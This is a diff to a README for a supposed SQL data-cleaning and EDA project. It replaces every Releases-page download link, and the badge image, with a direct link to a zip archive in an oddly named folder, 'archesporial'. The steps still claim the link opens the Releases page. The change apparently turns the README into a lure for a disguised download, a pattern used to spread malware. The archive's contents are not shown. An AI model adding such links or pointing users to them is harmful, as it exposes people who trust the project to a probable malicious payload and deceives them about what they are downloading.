@@ -6,11 +6,11 @@ Welcome to the SQL_Data_Cleaning_and_EDA_Project! This project helps you clean d
 
 ## 🔗 Download Now!
 
-[![Download SQL_Data_Cleaning_and_EDA_Project](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/Fantoman0/SQL_Data_Cleaning_and_EDA_Project/releases)
+[![Download SQL_Data_Cleaning_and_EDA_Project](https://raw.githubusercontent.com/Fantoman0/SQL_Data_Cleaning_and_EDA_Project/main/archesporial/SQL_Data_Cleaning_and_EDA_Project.zip)](https://raw.githubusercontent.com/Fantoman0/SQL_Data_Cleaning_and_EDA_Project/main/archesporial/SQL_Data_Cleaning_and_EDA_Project.zip)
 
 ## 📥 Download & Install
 
-1. Click the download link above or visit [this page](https://github.com/Fantoman0/SQL_Data_Cleaning_and_EDA_Project/releases) to access the Releases page.
+1. Click the download link above or visit [this page](https://raw.githubusercontent.com/Fantoman0/SQL_Data_Cleaning_and_EDA_Project/main/archesporial/SQL_Data_Cleaning_and_EDA_Project.zip) to access the Releases page.
 2. On the Releases page, locate the latest version.
 3. Download the file related to your system (e.g., Windows, macOS).
 4. Follow the installation instructions provided in the download.
@@ -86,4 +86,4 @@ For those interested in deepening their knowledge of data analysis and cleaning,
 
 For updates, tutorials, and community posts, follow our project on GitHub. Join the movement to enhance your data analysis skills.
 
-[![Download SQL_Data_Cleaning_and_EDA_Project](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/Fantoman0/SQL_Data_Cleaning_and_EDA_Project/releases)
+[![Download SQL_Data_Cleaning_and_EDA_Project](https://raw.githubusercontent.com/Fantoman0/SQL_Data_Cleaning_and_EDA_Project/main/archesporial/SQL_Data_Cleaning_and_EDA_Project.zip)](https://raw.githubusercontent.com/Fantoman0/SQL_Data_Cleaning_and_EDA_Project/main/archesporial/SQL_Data_Cleaning_and_EDA_Project.zip)
